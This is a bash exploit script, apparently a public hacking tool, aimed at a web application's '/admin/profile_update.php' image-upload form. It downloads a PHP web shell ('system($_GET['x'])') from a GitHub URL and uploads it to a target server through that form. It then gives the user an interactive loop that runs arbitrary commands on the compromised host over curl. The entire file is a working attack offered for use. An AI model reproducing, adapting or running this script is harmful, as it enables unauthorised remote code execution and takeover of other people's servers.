#!/bin/bash

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT} Jexpl12

EOF

if [ ! -f cmd.php ]; then
    wget https://raw.githubusercontent.com/jexpl12/Privuln-3xploit.id/main/cmd.php &> /dev/null
        if [ $(uname -m) == "Android" ]; then
            pip install httpie &> /dev/null
        else
            echo " script need httpie package to exploit as well"
            sudo apt install httpie -y &> /dev/null
        fi
fi

target="$1"

if [[ $target == "" ]]; then
    echo -e " Usage:  ./eraexploit.sh http://target.com"
else

echo " [+] checking vuln $target"
upload_shell=$(http --form POST "$target/admin/profile_update.php" img@"cmd.php" admin_name="" admin_phone="" admin_email="" submit="" | grep -o "Successfully")
    if [[ $upload_shell == "Successfully" ]]; then
        echo " [+] $target appear to be exploitable"
        echo " [!] spawing shell '<?php system($_GET['x']); ?>'"
        echo -e " [+] Done, Enjoy Bro\n"

        while true; do
            read -p "$ " 'cmd'
            if [[ $cmd == "clear" ]]; then
                clear
            elif [[ $cmd == "exit" ]]; then
                exit
            else
                x=$(printf "%s" "$cmd" | sed 's/ /%20/g')
                curl -s -k "$target/admin/img/admin/cmd.php?x=$x"
            fi
        done

    else
        echo " [!] $target wasn't vuln"
    fi
fi
